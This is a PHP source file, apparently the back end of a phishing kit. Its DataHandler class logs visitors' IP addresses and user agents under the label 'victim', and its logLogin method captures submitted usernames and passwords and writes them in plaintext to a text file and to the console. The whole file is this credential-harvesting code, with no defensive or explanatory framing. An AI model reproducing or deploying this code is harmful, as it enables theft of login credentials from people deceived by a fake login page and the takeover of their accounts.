<?php

abstract class DataHandler
{
    public static function logIp()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        }
        $useragent = $_SERVER['HTTP_USER_AGENT'];


        $file = __DIR__ . '/../../conected_ips.txt';
        $victim = "IP: ";
        $fp = fopen($file, 'a');

        fwrite($fp, "\n" . self::timestamp());
        fwrite($fp, $victim);
        fwrite($fp, $ipaddress);
        fwrite($fp, ' User-Agent: ' . $useragent);

        self::logToConsole(json_encode([
            'tag'       => 'visitor',
            'ip'        => $ipaddress,
            'useragent' => $useragent,
        ]));


        fclose($fp);
    }

    public static function logLogin()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        }

        $data = json_decode(file_get_contents('php://input'), true);

        $user = $_POST['user'] ?? $data['user'];
        $pass = $_POST['pass'] ?? $data['pass'];

        file_put_contents(
            __DIR__ . '/../../usernames.txt',
            "IP: $ipaddress\n" .
            "Username: $user\n" .
            "Password: $pass\n" .
            "——————————————————————————————————\n",
            FILE_APPEND
        );
        
        self::logToConsole(json_encode([
            'tag'  => 'login',
            'ip'   => $ipaddress,
            'user' => $user,
            'pass' => $pass,
        ]));
        
    }

    private static function logToConsole($string)
    {
        fwrite(fopen('php://stdout', 'w'), self::timestamp() . "$string\n");
    }

    private static function timestamp() {
        return "[" . date('D M d H:i:s Y')  . "][DataHandler]: ";
    }
}
